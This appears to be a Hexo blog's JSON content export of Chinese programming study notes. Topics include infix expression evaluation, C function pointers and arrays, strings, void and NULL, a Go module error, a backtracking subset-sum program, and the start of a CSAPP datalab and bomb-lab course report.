{"meta":{"title":"LittleBlackDot","subtitle":"","description":"","author":"LittleBlackDot","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"中缀表达式的计算","slug":"中缀表达式的计算","date":"2022-04-23T11:29:12.000Z","updated":"2022-04-23T11:30:16.614Z","comments":true,"path":"2022/04/23/中缀表达式的计算/","link":"","permalink":"http://example.com/2022/04/23/%E4%B8%AD%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E8%AE%A1%E7%AE%97/","excerpt":"&nbsp;","text":"&nbsp; 参考文章https://blog.csdn.net/sgbfblog/article/details/8001651 前言最近看面经看到了计算中缀表达式结果这个问题，自己猛的的一想，只想到和栈运用相关， 没啥具体思路， 于是就去查了查，记录下自己的简单实现， 主要还是放个大体思路在这里，方便以后忘了回看。 具体思路中缀表达式是不好直接计算的， 因改先把中缀表达式转换为后缀表达式， 计算后缀表达式在编程上是更好实现的。 计算后缀表达式的过程需要借用一个栈，存放数据， 遍历后缀表达式，遇到数据则入栈， 遇到运算符，连续出栈两个数据， 将两个数据和运算符构成的表达式的计算结果入栈，最后栈中的数据就是整个表达式的结果。 中缀表达式转后缀表达式需要一个栈，存放运算符。遍历中缀表达式，按下面的规则转换： 如果遇到操作数，我们就直接将其输出到结果表达式中 遇到运算符（左右括号也看作运算符） 遇到右括号 ， 不断将栈中的运算符出栈，并输出到结果表达式中, 直到遇到左括号， 左括号只出栈不输出到结果表达式中。 遇到左括号直接入栈 遇到’+’, ‘-‘ 之类的运算符， 若栈顶运算符优先级不小于（大于等于）当前遇到的运算符，则出栈运算符到结果表达式中， 持续这个动作直到栈顶运算符为左括号， 或者栈空。然后将当前遇到的运算符入栈。 遍历结束后， 若栈不空，将栈中所有元素出栈到结果表达式中。 写的思路可能不是那么直观，去看看参考文章，那里有实例， 看过之后就会明白了。。。。。 用C++简单实现了一下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;stack&gt;using namespace std;int getPriority(char );&#x2F;&#x2F;获取运算符优先级string convertToSuffix(string); &#x2F;&#x2F;将中缀表达式转化为后缀表达式double getResult(string); &#x2F;&#x2F;计算后缀表达式获取结果int main() &#123; string str &#x3D; &quot;1+2*3+(4*5+6)*7&quot;; string str2 &#x3D; convertToSuffix(str); cout&lt;&lt; getResult(str2) &lt;&lt;endl; return 0;&#125;int getPriority(char a)&#123; int ret &#x3D; 0; switch(a)&#123; case &#39;+&#39;: ret &#x3D; 1; break; case &#39;-&#39;: ret &#x3D; 1; break; case &#39;*&#39;: ret &#x3D; 2; break; case &#39;&#x2F;&#39;: ret &#x3D; 2; break; case &#39;(&#39;: ret &#x3D; 0; break; default: break; &#125; return ret;&#125;string convertToSuffix(string str)&#123; string ret &#x3D; &quot;&quot;; stack&lt;char&gt; s; for(int i&#x3D;0; i&lt;str.size(); i++)&#123; if(&#39;0&#39; &lt;&#x3D; str[i] &amp;&amp; str[i] &lt;&#x3D; &#39;9&#39;)&#123;&#x2F;&#x2F;0-9直接输出到结果中 ret +&#x3D; str[i]; &#125;else if(&#39;(&#39; &#x3D;&#x3D; str[i])&#123;&#x2F;&#x2F;碰到左括号直接入栈 s.push(str[i]); &#125;else if(&#39;)&#39; &#x3D;&#x3D; str[i])&#123;&#x2F;&#x2F;碰到右括号出栈到左括号 while(s.top() !&#x3D; &#39;(&#39;)&#123; ret +&#x3D; s.top(); s.pop(); &#125; s.pop(); &#125;else&#123;&#x2F;&#x2F;碰到运算符， 出栈优先级不小于它的所有运算符在将其入栈 while(!s.empty() &amp;&amp; getPriority(s.top()) &gt;&#x3D; getPriority(str[i]))&#123; ret +&#x3D; s.top(); s.pop(); &#125; s.push(str[i]); &#125; &#125; while(!s.empty())&#123; ret +&#x3D; s.top(); s.pop(); &#125; return ret;&#125;double getResult(string str)&#123; double ret &#x3D; 0; stack&lt;double&gt; s_num; for(int i&#x3D;0; i&lt;str.size(); i++)&#123; if(&#39;0&#39;&lt;&#x3D; str[i] &amp;&amp; str[i] &lt;&#x3D; &#39;9&#39;)&#123; &#x2F;&#x2F;遇到数字则入栈 s_num.push(str[i]-&#39;0&#39;); &#125;else&#123; &#x2F;&#x2F;遇到运算符出栈两个数参与运算再把结果入栈 double temp1; double temp2; double temp3; temp1 &#x3D; s_num.top(); s_num.pop(); temp2 &#x3D; s_num.top(); s_num.pop(); switch(str[i])&#123; case &#39;+&#39;: temp3 &#x3D; temp1 + temp2; break; case &#39;-&#39;: temp3 &#x3D; temp1 - temp2; break; case &#39;*&#39;: temp3 &#x3D; temp1 * temp2; break; case &#39;&#x2F;&#39;: temp3 &#x3D; temp1 &#x2F; temp2; break; default: break; &#125; s_num.push(temp3); &#125; &#125; return s_num.top();&#125;","categories":[],"tags":[]},{"title":"对C中函数名和数组名的一些理解","slug":"对C中函数名和数组名的一些理解","date":"2022-04-23T11:23:40.000Z","updated":"2022-04-23T11:28:13.062Z","comments":true,"path":"2022/04/23/对C中函数名和数组名的一些理解/","link":"","permalink":"http://example.com/2022/04/23/%E5%AF%B9C%E4%B8%AD%E5%87%BD%E6%95%B0%E5%90%8D%E5%92%8C%E6%95%B0%E7%BB%84%E5%90%8D%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/","excerpt":"&nbsp;","text":"&nbsp; 参考文章： https://blog.csdn.net/lin37985/article/details/43020621 https://www.zhihu.com/question/293674445 https://www.cnblogs.com/liqiuhao/p/7737539.html 前言： 在想实现一个通用性高的链表的时候想用回调函数，但是只知道可以用函数指针来实现，而且自己的函数指针也只是停留在老师教的层次，没有怎么用过，在百度了用法之后，感觉有些不正常，记录下，以后可能会再用到； 正篇： 我接触C的函数指针时学到的用法如下： 1234567void func(int a)&#123; printf(&quot;%d \\n&quot;, a);&#125;int main()&#123; void (*fp)(int) &#x3D; &amp;func; (*fp)(2);&#125; 上面的例子定义了一个函数指针fp，并通过fp来调用函数func，这里的用法很正常，符合一般指针的使用方式 先把func的地址给fp，在通过*fp访问func。 再看回调函数的一般用法 1234567891011121314151617181920212223242526typedef void (*FuncType)(int);&#x2F;&#x2F;定义一个函数指针类型FunTypevoid MyFun1(int x);void MyFun2(int x);void MyFun3(int x);void CallMyFun(int, FunType)int main()&#123; CallMyFun(MyFun1,10); CallMyFun(MyFun2,20); CallMyFun(MyFun3,30);&#125;void CallMyFun(FunType fp,int x) &#123; fp(x);&#125;void MyFun1(int x) &#123; printf(&quot;函数MyFun1中输出：%d\\n&quot;,x);&#125;void MyFun2(int x)&#123; printf(&quot;函数MyFun2中输出：%d\\n&quot;,x);&#125;void MyFun3(int x)&#123; printf(&quot;函数MyFun3中输出：%d\\n&quot;,x);&#125; 我感觉奇怪的地方在函数指针调用的时候（CallMyFun中)： 在上面基础的用法是： 1fp &#x3D; &amp;func;(*fp)(1); 这里的用法是： 1fp &#x3D; funcfp(1); 甚至在看了博客后还有这样的用法（这个用法还是有惊艳到我的） 1(*func)(1);&#x2F;&#x2F;func是函数名 怪的地方来了，可以通过函数名，函数名的地址，甚至是函数名指向的内容来引用函数 难道说这三个值是一样的？于是去试了一下 12345678910111213141516void func(int a)&#123; printf(&quot;%d \\n&quot;, a); &#125;int main()&#123; void (*fp)(int) &#x3D; &amp;func; (*fp)(1); fp(1); fp &#x3D; func; fp(1); (*func)(1); printf(&quot;func: %p\\n&quot;, func); printf(&quot;&amp;func: %p\\n&quot;, &amp;func); printf(&quot;*func: %p\\n&quot;, *func); return 0;&#125; 上机运行后发现三个值确实一样，但为什么回事这个结果？会是编译器的特殊处理吗？函数名不是函数的入口地址吗？起始内容不应该是函数内容相关的指令吗？ 看了看博客给的解释： 1）其实，MyFun的函数名与FunP函数指针都是一样的，即都是函数指针。MyFun函数名是一个函数指针常量，而FunP是一个函数数指针变量，这是它们的关系。2）但函数名调用如果都得如(*MyFun)(10)这样，那书写与读起来都是不方便和不习惯的。所以C语言的设计者们才会设计成又可允许MyFun(10)这种形式地调用（这样方便多了并与数学中的函数形式一样，不是吗？）。3）为统一起见，FunP函数指针变量也可以FunP(10)的形式来调用。4）赋值时，即可FunP = &amp;MyFun形式，也可FunP = MyFun。 他给的解释也没有提到具体的实现细节。而且描述的不是很清晰，不是那么的让人接受。。。 终于知乎上(参考文章第二篇)看到了一个让人满意的答案： 123456789101112131415161718192021func 得到函数地址，是因为它是函数指示符。只有在作为 sizeof 或者单目 &amp; 操作符的操作数时，它的类型才是函数；其它情况都会被转化为指向该函数的指针。A function designator is an expression that has function type. Except when it is the operand of the sizeof operator or the unary &amp; operator, a function designator with type &#39;&#39;function returning type&#39;&#39; is converted to an expression that has type &#39;&#39;pointer to function returning type&#39;&#39;.6.3.2.1 Lvalues, arrays, and function designators&amp;func 得到函数地址，是因为单目 &amp; 操作符本来就是用来取操作数的地址的。而根据上一条，此处操作数的类型就是 func 函数，所以这个表达式可以得到 func 函数的地址。The unary &amp; operator yields the address of its operand.6.5.3.2 Address and indirection operators*func 得到函数地址，是因为本来就有相关的规定，表达式 *函数 的值是对应的函数指示符，于是参见第一条。The unary * operator denotes indirection. If the operand points to a function, the result is a function designator;6.5.3.2 Address and indirection operatorsp.s. 以上引用内容为 C99p.p.s. 数组同理，并且文档都在这些条目的周边。 数组的相关内容(参考文章第三篇)： 123456789C99 6.3.2.1 Lvalues, arrays, and function designators 中第三段是这样说的：Except when it is the operand of the sizeof operator or the unary &amp; operator, or is astring literal used to initialize an array, an expression that has type ‘‘array of type’’ isconverted to an expression with type ‘‘pointer to type’’ that points to the initial element ofthe array object and is not an lvalue. If the array object has register storage class, thebehavior is undefined.译：除了在使用sizeof和&amp;运算符或者使用字符串字面量初始化数组之外，一个含有数组名的表达式会转化为含有指向首元素的表达式，并且转化后不是一个左值（这也是为什么我们不能修改这个标志符，例如val++，所以有的人也会说数组名是一个const指针，从本质上说这也是错的）。如果数组的存储类型是寄存器的话，行为是未定义的。（估计也没人这么做吧。。） 数组名不是首地址指针，数组名是一个标识符，它标识出我们之前申请的一连串内存空间，而且这个空间内的元素类型是相同的——即数组名代表的是一个内存块及这个内存块中的元素类型 。只是在大多数情况下数组名会“退化”（C标准使用的decay和converted这两个词）为指向第一个元素的指针。 这里也解释了这个： 12345678910void func(int* );int main()&#123; a[10]; printf(&quot;%d \\n&quot;, sizeof(a));&#x2F;&#x2F;40(sizeof是运算符，不是函数) func(a);&#125;func(int a[])&#123; printf(&quot;%d \\n&quot;, sizeof(a));&#x2F;&#x2F;8(64位os下)&#125; 对于数组指针(int (*p) [5]的解释： p表示的是一个指向一个元素类型为整数，元素个数为5的内存块的指针 到这里，虽然他们的数据内容一致，但还要注意一下数据的类型：在数组上尤其是，因为数组指针的操做平时还是有用到的，函数指针除了用来引用函数，也不会去做一些类似数组指针的操作，而且有些操做也不允许。。。。。","categories":[],"tags":[]},{"title":"C中的字符串","slug":"C中的字符串","date":"2022-04-23T11:21:03.000Z","updated":"2022-04-23T11:21:49.823Z","comments":true,"path":"2022/04/23/C中的字符串/","link":"","permalink":"http://example.com/2022/04/23/C%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"&nbsp;","text":"&nbsp; 下面的内容根据翁凯老师的C语言慕课的内容总结所得： 字符串： 以0结尾的一串字符（结尾字符ascii值为0，’\\0’的sacii值为0） 0(‘\\0’)标志值符串的结束但它不是字符串的一部分 计算字符串长度的时候不包含这个0，但是它是占一字节的空间的，具体问题具体分析。 字符串以数组的形式存在，以数组或指针的形式访问 特殊的一点，字符串字面量可以用来初始化字符数组 字符串常量： 形如”hello” “hello”会被编译器变成一个字符数组放在某处(rodata段,只读)，这个数组长度是6，结尾有表示结束的0(‘\\0’) 我对字符串的误解是在字符串常量这个点，没有理解C中字符串常量的存储方式 例如，char *p = “hello”; 根据一般的指针思想，我把上面的表达式理解为：”hello“代表了一个地址，并把这个地址赋值给 p这个指针变量， 我会认为 p = “hello” ，字符串”hello“被转换成地址的形式，而p的值就是这个地址，复习C语言的时，在实现strcpy考虑参数类型的时候，我想的函数参数类型。和标准库里的不一样，因为这个冲突，我对自己的字符认知产生了怀疑，然后回头再看了一遍翁凯老师的C语言慕课,有了新的收获。 就如同上面的总结，形如”hello“的值符串常量，会被编译器变成一个数组放在代码段，然后char *p = “hello”,语句的效果是，将”hello“所在数组的首地址赋值给p。 这里也解释了一种情况，我想要输出单个字符的时候需要用到*p，而不是p.这个点用我之前的想法是解释不通的。 总结一句话 ，字符串以数组的形式存在，以数组或指针的形式访问。这个点算是我新的收获了；","categories":[],"tags":[]},{"title":"C中的void","slug":"C中的void","date":"2022-04-23T11:15:12.000Z","updated":"2022-04-23T11:31:12.890Z","comments":true,"path":"2022/04/23/C中的void/","link":"","permalink":"http://example.com/2022/04/23/C%E4%B8%AD%E7%9A%84void/","excerpt":"&nbsp;","text":"&nbsp; 参考文章:https://www.iteye.com/blog/zhengdl126-1739165 https://stackoverflow.com/questions/7016861/why-are-null-pointers-defined-differently-in-c-and-c void最初接触当然是在学C的时候，见到的用法就是指明函数无需返回指，在学校计算机系统基础课的malloc_lab(CSAPP里的)里，大量的用到了void类型的指针，在做实验的时候了解了一下void的用法； 首先当然是百度后看前辈们的分享的知识； VOID用法: 如果函数没有返回值，那么应声明为void类型; 如果函数无参数，那么应声明其参数为void； 如果函数的参数可以是任意类型指针，那么应声明其参数为void * ； void不能代表一个真实的变量； VOID*使用注意事项： 任何类型的指针都可以直接赋值给void* 类型变量；但是，void * 类型的变量作为右值赋给任意类型指针变量时要做类型转换。因为“无类型”可以包容“有类型”，而“有类型”则不能包容“无类型”；（C++适用，C中不适用） e.g. 12345int a &#x3D; 0;int *p &#x3D; &amp;a;void *vp &#x3D; NULL;p &#x3D; (int *)vp;vp &#x3D; p; 在网上百度看一种说法，NULL是((void *) 0),的宏,依据是stdio.h里的声明： 1234567#ifndef NULL#ifdef __cplusplus#define NULL 0#else &#x2F;* __cplusplus *&#x2F;#define NULL ((void *)0)#endif &#x2F;* __cplusplus *&#x2F;#endif &#x2F;* NULL *&#x2F; 上面可以看出在C++中NULL是 0，在C中NULL被定义为 (（void*)0 )，在c中void* 类型的值可以直接赋值给任意类型的指针变量，在dev C++分别在.c和.cpp文件里比编译下面这个语句： 1int *p &#x3D; (void*)0 前者编译后没有任何提示信息，后者会报错……. 至于为什么c和c++的NULL不一样，stackoverflow里看到了一个问答，里面给出了C和C++对空指针常量(NULL)的不同定义: Back in C++03, a null pointer was defined by the ISO specification (§4.10/1) as A null pointer constant is an integral constant expression (5.19) rvalue of integer type that evaluates to zero. In C, this rule is similar, but is a bit different (§6.3.2.3/3): An integer constant expression with the value 0, or such an expression cast to type void *, is called a null pointer constant.55) If a null pointer constant is converted to a pointer type, the resulting pointer, called a null pointer, is guaranteed to compare unequal to a pointer to any object or function. 看来在c中0和(void*)0都能表示空指针常量，所以在C和C++里都能这样写: int *p = 0;, 在C++里可以写看起来怪但没有错的语句：int a = NULL;,这里又引出几个nullptr之于NULL的优点。 如果再看到这里又想不起来就重新看看吧：https://stackoverflow.com/questions/7016861/why-are-null-pointers-defined-differently-in-c-and-c 如果函数没有返回值，那么应声明为void类型;在C语言中，凡不加返回值类型限定的函数，就会被编译器作为返回整型值处理。如果函数无参数,那么应声明其参数为void在C++语言中声明一个这样的函数： 1int function(void)&#123; return 1;&#125; 则进行下面的调用是不合法的：function(2);因为在C++中，函数参数为void的意思是这个函数不接受任何参数。我们在Turbo C 2.0中编译： 12345678#include &quot;stdio.h&quot;fun()&#123; return 1;&#125;main()&#123; printf(&quot;%d&quot;,fun(2)); getchar();&#125; 编译正确且输出1，这说明，在C语言中，可以给无参数的函数传送任意类型的参数，但是在C++编译器中编译同样的代码则会出错。在C++中，不能向无参数的函数传送任何参数，出错提示“’fun’ : function does not take 1 parameters”。所以，无论在C还是C++中，若函数不接受任何参数，一定要指明参数为void。\\3. void不能代表一个真实的变量void a; //错误function(void a); //错误 小结正如博主所说，void体现了一种抽象,void*很类似面向对象里的泛型。面向过程语言也有面向对象的思想，面向过程也可以写面向对象的东西。语言只是工具，编程重要的是思想。","categories":[],"tags":[]},{"title":"go包管理机制的一个小坑","slug":"go包管理机制的一个小坑","date":"2022-04-23T11:10:56.000Z","updated":"2022-04-23T11:22:11.307Z","comments":true,"path":"2022/04/23/go包管理机制的一个小坑/","link":"","permalink":"http://example.com/2022/04/23/go%E5%8C%85%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E5%9D%91/","excerpt":"&nbsp;","text":"&nbsp; 在go程序里引用自己写的包出现里下列报错： 1src\\myGopl.io\\ch2\\lengthConvTest\\main.go:9:2: no required module provides package myGopl.io&#x2F;ch2&#x2F;lengthConv: working directory is not part of a module 这里是main里的import 12345678import ( &quot;bufio&quot; &quot;fmt&quot; &quot;os&quot; &quot;strconv&quot; &quot;myGopl.io&#x2F;ch2&#x2F;lengthConv&quot;) lengthConv是自己写的包，文件结构如下： 百度了许久，改下 go env 中的 GO111MODULE 参数 设置为 auto（cmd命令：go env -w GO111MODULE=auto），问题解决，可以运行。但是vscode导包的地方有黄下划线提示有问题 百度里找到相关介绍： GO111MODULE 值 Go 1.13 &lt;Go 1.13 Go 1.16 on 任何路径下都开启module-aware模式 任何路径下都开启module-aware模式 【默认值】：任何路径下都开启module-aware模式 auto 【默认值】：使用GOPATH mode还是module-aware mode，取决于要构建的源码目录所在位置以及是否包含go.mod文件。如果要构建的源码目录不在以GOPATH/src为根的目录体系下，且包含go.mod文件(两个条件缺一不可)，那么使用module-aware mode；否则使用传统的GOPATH mode。 【默认值】：只要当前目录或父目录下有go.mod文件时，就开启module-aware模式，无论源码目录是否在GOPATH外面 只要当前目录或父目录下有go.mod文件时，就开启module-aware模式，无论源码目录是否在GOPATH外面 off gopath模式 gopath模式 gopath模式 go111modulego111module 是一个环境变量，通过该变量的配置，可以改变go 引用包的行为 同的go 版本，对于该环境变量有不同的表现: (1) go1.11 和 go1.12 中的go111module go111module=on 选项，将强制使用 gomodule模块管理包，即使项目位于gopath中 go111module=off 选项，将强制使用 gopath管理包，即使项目不在gopath中 go111module=auto 选项，是默认的选项，将根据情况分为: a. 当位于gopath中，表现为 go111module=off b. 当位于gopath外，表现为 go111module=on (2) go1.13 中的go111module a. 当存在 go.mod ，表现为 go111module=on b. 当在gopath外，即使没有 go.mod ,表现为 go111module=on c. 当在gopath内，并且没有go.mod 时候，表现为 go111module=off","categories":[],"tags":[]},{"title":"回溯算法--子列和问题","slug":"回溯算法-子列和问题","date":"2022-04-23T09:23:32.000Z","updated":"2022-04-23T09:26:44.207Z","comments":true,"path":"2022/04/23/回溯算法-子列和问题/","link":"","permalink":"http://example.com/2022/04/23/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95-%E5%AD%90%E5%88%97%E5%92%8C%E9%97%AE%E9%A2%98/","excerpt":"&nbsp;","text":"&nbsp; 参考文章:https://www.cnblogs.com/lv88/p/4491796.html 正文:算法课的第四章的第一个实验,做之前看了一下算法网课的介绍,主要思想就是遍历子集树,在遍历的时候会检查当前节点是否符合约束条件,不符合的化就放弃当前节点以下的结果集;可能是当初数据结构没学好,就非递归构造树的遍历都费了我老鼻子劲了;记录下做题的思路吧;先上代码: ……………栈的相关操作就不写了,太占篇幅; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct StackNode&#123; int i;&#x2F;&#x2F;当前节点对应数组第i号元素(0开始) int x;&#x2F;&#x2F;第i号节点是否被选中 struct StackNode *next;&#125;node;&#x2F;&#x2F;结果集节点结构node* init();&#x2F;&#x2F;栈初始化void push(node *, int ,int);node pop(node *);int isEmpty(node *);void Destory(node *);void sort(int *,int);int main()&#123; int n,goal,tg,ti &#x3D; -1,ts &#x3D; 0,h; node *top,last; scanf(&quot;%d %d&quot;,&amp;n,&amp;goal); int a[n]; int s[n]; for(int i &#x3D; 0; i &lt; n; i++)&#123; scanf(&quot;%d&quot;,&amp;a[i]); s[i] &#x3D; -1; &#125; sort(a,n); node *plist &#x3D; init(); tg &#x3D; goal; while(1)&#123; if(isEmpty(plist))&#123;&#x2F;&#x2F;栈空时的操作 if(0 &#x3D;&#x3D; plist-&gt;i)&#123;&#x2F;&#x2F;第二次栈空操作 push(plist,0,0); plist-&gt;i &#x3D; 1; &#125;else if(-1 &#x3D;&#x3D; plist-&gt;i)&#123;&#x2F;&#x2F;第一次栈空操作 if(a[0]&lt;&#x3D;tg)&#123;&#x2F;&#x2F;满足约束条件,取当前节点元素,x置1 push(plist,0,1); plist-&gt;i &#x3D; 0; s[0] &#x3D; 1; tg -&#x3D; a[plist-&gt;next-&gt;i]; &#125;else&#123;&#x2F;&#x2F;不满足条件,不取,x置0 push(plist,0,0); plist-&gt;i &#x3D; 1; &#125; &#125;else&#x2F;&#x2F;第三次栈空结果集遍历完成,退出循环 break; &#125; top &#x3D; plist-&gt;next; ti &#x3D; top-&gt;i; if(ti &#x3D;&#x3D; n-1)&#123;&#x2F;&#x2F;当前路径走到结果集底部时,此路径不是有效解,回溯,寻找其他解 last &#x3D; pop(plist); s[ti] &#x3D; 0; tg +&#x3D; a[ti]*last.x; continue; &#125; if(last.i &#x3D;&#x3D; ti+1)&#123;&#x2F;&#x2F;检查是否有回溯 if(1 &#x3D;&#x3D; last.x)&#123;&#x2F;&#x2F;上一轮回溯前的路径是走的1还是0(从左子树回溯到当前节点的还是右子树) push(plist,ti+1,0); s[ti+1] &#x3D; 0; &#125;else&#123;&#x2F;&#x2F;右子树回溯的,当前结点结果集遍历完成,回溯到上一层; last &#x3D; pop(plist); tg +&#x3D; a[ti]*last.x; s[ti] &#x3D; 0; &#125; continue; &#125; push(plist,ti+1,1);&#x2F;&#x2F;默认先录入当前节点元素 tg -&#x3D; a[ti+1]; if(tg &gt;&#x3D; 0)&#123; s[ti+1] &#x3D; 1; &#125;else&#123;&#x2F;&#x2F;不满足条件,回溯 s[ti+1] &#x3D; 0; tg +&#x3D; a[ti+1]; last &#x3D; pop(plist); &#125; if(tg &#x3D;&#x3D; 0) break; &#125; Destory(plist); if(tg) printf(&quot;No Solution!&quot;); else for(int i &#x3D; 0; i &lt; n; i++)&#123; if(1 &#x3D;&#x3D; s[i]) printf(&quot;%d &quot;,a[i]); &#125; &#125; 这个问题是oj上的一道题但是我写的老是超时,所以就在百度上看到了参考文章,给了我一些启发,但是对输入排序是会改变结果输出的顺序的,然后oj会判错,因为不加排序的时候会显示超时,加了之后直接就判错了………,但是排序后应该是会有影响的.","categories":[],"tags":[]},{"title":"计算机系统基础(上)实验报告-CSAPP拆弹实验","slug":"计算机系统基础-上-实验报告-CSAPP拆弹实验","date":"2022-04-23T08:51:11.000Z","updated":"2022-04-23T09:21:13.624Z","comments":true,"path":"2022/04/23/计算机系统基础-上-实验报告-CSAPP拆弹实验/","link":"","permalink":"http://example.com/2022/04/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80-%E4%B8%8A-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A-CSAPP%E6%8B%86%E5%BC%B9%E5%AE%9E%E9%AA%8C/","excerpt":"&nbsp;","text":"&nbsp; 参考文章:https://blog.csdn.net/The_V_/article/details/46842573?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1 https://www.cnblogs.com/chkkch/archive/2011/05/21/2052708.html https://blog.csdn.net/shiyuqing1207/article/details/46316519?utm_medium=distribute.pc_relevant.none-task-blog-title-6&amp;spm=1001.2101.3001.4242 Lab1： 数据操纵实验123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136int bitXor(int x, int y) &#123; int c&#x3D;~((~(~x&amp;y))&amp;(~(x&amp;(~y)))); return c;&#125;int getByte(int x, int n) &#123; return ((x&gt;&gt;(n&lt;&lt;3))&amp;0xff);&#125;int logicalShift(int x, int n) &#123; int t&#x3D;~(((1&lt;&lt;31)&gt;&gt;n)&lt;&lt;1); return (x&gt;&gt;n)&amp;t;&#125;int bitCount(int x) &#123; int result; int tmp_mask1&#x3D;(0x55)|(0x55&lt;&lt;8); int mask1&#x3D;(tmp_mask1)|(tmp_mask1&lt;&lt;16); int tmp_mask2&#x3D;(0x33)|(0x33&lt;&lt;8); int mask2&#x3D;(tmp_mask2)|(tmp_mask2&lt;&lt;16); int tmp_mask3&#x3D;(0x0f)|(0x0f&lt;&lt;8); int mask3&#x3D;(tmp_mask3)|(tmp_mask3&lt;&lt;16); int mask4&#x3D;(0xff)|(0xff&lt;&lt;16); int mask5&#x3D;(0xff)|(0xff&lt;&lt;8); result&#x3D;(x&amp;mask1)+((x&gt;&gt;1)&amp;mask1); result&#x3D;(result&amp;mask2)+((result&gt;&gt;2)&amp;mask2); result&#x3D;(result+(result&gt;&gt;4))&amp;mask3; result&#x3D;(result+(result&gt;&gt;8))&amp;mask4; result&#x3D;(result+(result&gt;&gt;16))&amp;mask5; return result;&#125;int bang(int x) &#123; return (~((x|(~x+1))&gt;&gt;31))&amp;1;&#125;int tmin(void) &#123; return 1&lt;&lt;31;&#125;int byteSwap(int x, int n, int m) &#123; int xn&#x3D;n&lt;&lt;3; int xm&#x3D;m&lt;&lt;3; int x1&#x3D;(x&gt;&gt;xn)&lt;&lt;xm; int x2&#x3D;(x&gt;&gt;xm)&lt;&lt;xn; int t&#x3D;(x&amp;(~(0xff&lt;&lt;xn))&amp;(~(0xff&lt;&lt;xm)))|(x1&amp;(0xff&lt;&lt;xm))|(x2&amp;(0xff&lt;&lt;xn)); return t;&#125;int byteXor(int x, int y, int n) &#123; n&#x3D;n&lt;&lt;3; x&#x3D;(x&gt;&gt;n)&amp;0xff; y&#x3D;(y&gt;&gt;n)&amp;0xff; return !!(x^y);&#125;unsigned float_abs(unsigned uf) &#123; int x &#x3D; uf&amp;0x7fffffff; if(x&gt;0x7f800000) return uf; else return x;&#125;int isPositive(int x) &#123; return !((x&gt;&gt;31)|(!x));&#125;int isLessOrEqual(int x, int y) &#123; int signx&#x3D;(x&gt;&gt;31)&amp;1;&#x2F;&#x2F;x的符号位 int signy&#x3D;(y&gt;&gt;31)&amp;1;&#x2F;&#x2F;y的符号位 int signy_x&#x3D;((y+~x+1)&gt;&gt;31)&amp;1;&#x2F;&#x2F;y-x的符号位 return (!(signx^signy)&amp;!signy_x) | ((signx^signy)&amp;signx);&#x2F;&#x2F;同号 异号 &#125;int ilog2(int x) &#123; int sign,shift1,shift2,shift3,shift4,shift5; sign&#x3D;!!(x&gt;&gt;16);&#x2F;&#x2F;若x表示的二进制数左边16位没有1，sign为0,有1则sign为1 shift1&#x3D;sign&lt;&lt;4;&#x2F;&#x2F;0^4 or 2^4 x&#x3D;x&gt;&gt;shift1;&#x2F;&#x2F;若sign为1，丢掉右边16位，因为1必定出现在左边16位中 sign&#x3D;!!(x&gt;&gt;8);&#x2F;&#x2F;若x表示的二进制数左边8位没有1，sign为0,有1则sign为1 shift2&#x3D;sign&lt;&lt;3;&#x2F;&#x2F;0^3 or 2^3 x&#x3D;x&gt;&gt;shift2;&#x2F;&#x2F;若sign为1，丢掉右边8位，因为1必定出现在左边8位中 sign&#x3D;!!(x&gt;&gt;4);&#x2F;&#x2F;若x表示的二进制数左边4位没有1，sign为0,有1则sign为1 shift3&#x3D;sign&lt;&lt;2;&#x2F;&#x2F;0^2 or 2^2 x&#x3D;x&gt;&gt;shift3;&#x2F;&#x2F;若sign为1，丢掉右边4位，因为1必定出现在左边4位中 sign&#x3D;!!(x&gt;&gt;2);&#x2F;&#x2F;若x表示的二进制数左边2位没有1，sign为0,有1则sign为1 shift4&#x3D;sign&lt;&lt;1;&#x2F;&#x2F;0^1 or 2^1 x&#x3D;x&gt;&gt;shift4;&#x2F;&#x2F;若sign为1，丢掉右边2位，因为1必定出现在左边2位中 sign&#x3D;!!(x&gt;&gt;1);&#x2F;&#x2F;若x表示的二进制数左边1位没有1，sign为0,有1则sign为1 shift5&#x3D;sign; return shift1+shift2+shift3+shift4+shift5;&#x2F;&#x2F;偏移量相加即得结果&#125;unsigned float_neg(unsigned uf) &#123; unsigned result; unsigned tmp; tmp&#x3D;uf&amp;(0x7fffffff); result&#x3D;uf^0x80000000; if(tmp&gt;0x7f800000) result &#x3D;uf; return result;&#125;int float_f2i(unsigned uf) &#123; int sign&#x3D;uf&gt;&gt;31; int exp&#x3D;(uf&gt;&gt;23)&amp;0xff; int frac&#x3D;uf&amp;0x007fffff; int right&#x3D;157-exp; int abs; if (exp&lt;0x7f) return 0; if (exp&gt;157) return 0x80000000; abs&#x3D;(0x40000000+(frac&lt;&lt;7))&gt;&gt;right; if (sign) return -abs; else return abs;&#125;unsigned float_twice(unsigned uf) &#123; unsigned f&#x3D;uf; if((f&amp;0x7f800000)&#x3D;&#x3D;0)&#123; f&#x3D;((f&amp;0x007FFFFF)&lt;&lt;1|(0x80000000&amp;f)); &#125;else if ((f&amp;0x7F800000)!&#x3D;0x7F800000)&#123; f+&#x3D;0x00800000; &#125; return f;&#125; Lab2: 拆弹实验第一关反汇编内容： 123456789101112131408048b5a &lt;phase_1&gt;: 8048b5a: 55 push %ebp 8048b5b: 89 e5 mov %esp,%ebp 8048b5d: 83 ec 10 sub $0x10,%esp 8048b60: 68 44 a1 04 08 push $0x804a144 